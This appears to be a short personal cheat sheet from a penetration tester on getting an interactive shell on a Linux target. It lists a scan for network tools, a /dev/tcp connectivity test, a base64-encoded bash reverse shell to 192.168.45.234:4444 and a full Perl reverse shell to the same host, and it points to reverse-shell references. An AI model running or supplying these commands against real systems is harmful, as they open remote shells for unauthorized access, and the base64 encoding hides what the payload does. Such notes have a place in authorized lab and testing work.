# cant-make-shell-interactive

**Author:** Julien Bongars\
**Date:** 2026-02-25 03:26:12
**Path:**

---

## Scan for tools

```bash
# using which
which nc ncat netcat bash sh zsh python python2 python3 perl php ruby socat curl wget telnet awk gawk lua node nodejs java gcc cc busybox script expect scp sftp ftp ssh openssl nmap xterm

# if which is broken
type nc ncat netcat bash sh zsh python python2 python3 perl php ruby socat curl wget telnet awk gawk lua node nodejs java gcc cc busybox script expect scp sftp ftp ssh openssl nmap xterm
```

## Check connection

```bash
# try to ping your server
ping -c 1 YOUR_IP

# Try to forward something more simple like echo
echo test > /dev/tcp/YOUR_IP/80

# Try to use common ports like 443,80,53
```

## Check if can eval base64

```bash
# should echo hello
echo ZWNobyAiaGVsbG8iCg== | base64 -d
echo ZWNobyAiaGVsbG8iCg== | base64 -d | eval

bash -c "bash <(echo ZWNobyAiaGVsbG8iCg== | base64 -d)"
echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNC80NDQ0IDA+JjEK' | base64 -d
```

## Try perl/python?

```bash
perl -e 'use Socket;$i="192.168.45.234";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Refer to docs on more information on getting shell

~/.hacklas/external/hacktricks/src/generic-hacking/reverse-shells/linux.md

~/.hacklas/external/internal-all-the-things/docs/cheatsheets/shell-reverse-cheatsheet.md
